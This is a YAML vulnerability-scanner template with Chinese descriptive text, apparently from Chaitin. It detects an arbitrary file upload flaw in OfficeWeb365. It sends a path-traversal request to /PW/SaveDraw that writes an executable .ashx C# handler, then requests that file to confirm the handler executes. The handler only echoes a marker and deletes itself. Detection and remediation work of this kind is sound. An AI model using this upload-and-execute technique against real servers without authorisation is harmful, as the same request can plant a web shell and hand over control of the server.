id: officeweb365-file-upload
info:
  name: OfficeWeb365 - 任意文件上传漏洞
  author: Chaitin
  severity: high
  description: |
    该模板用于检测 OfficeWeb365 - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/PW/SaveDraw?path=../../Content/img&idx={{s2}}.ashx`、`/Content/img/UserDraw/drawPW{{s2}}.ashx` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-756407
    vendor: officeweb365
    product: officeweb365
  tags: fileupload,vuln,officeweb365
variables:
  s2: '{{to_lower(rand_text_alpha(8))}}'
  s3: '{{to_lower(rand_text_alpha(8))}}'
  randomHash: '{{md5(s3)}}'
flow: http(1) && http(2)
http:
  - method: GET
    path:
      - '{{BaseURL}}/PW/SaveDraw?path=../../Content/img&idx={{s2}}.ashx'
    redirects: false
    body: |-
      data:image/png;base64,{{randomHash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
      {
      public void ProcessRequest(System.Web.HttpContext context)
      {
      System.Web.HttpResponse response = context.Response;
      response.Write("{{s3}}");

      string filePath = context.Server.MapPath("/") + context.Request.Path;
      if (System.IO.File.Exists(filePath))
      {
          System.IO.File.Delete(filePath);
      }
      }
      public bool IsReusable
      {
      get { return false; }
      }
      }///---
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "ok")'
  - method: GET
    path:
      - '{{BaseURL}}/Content/img/UserDraw/drawPW{{s2}}.ashx'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, s3)'
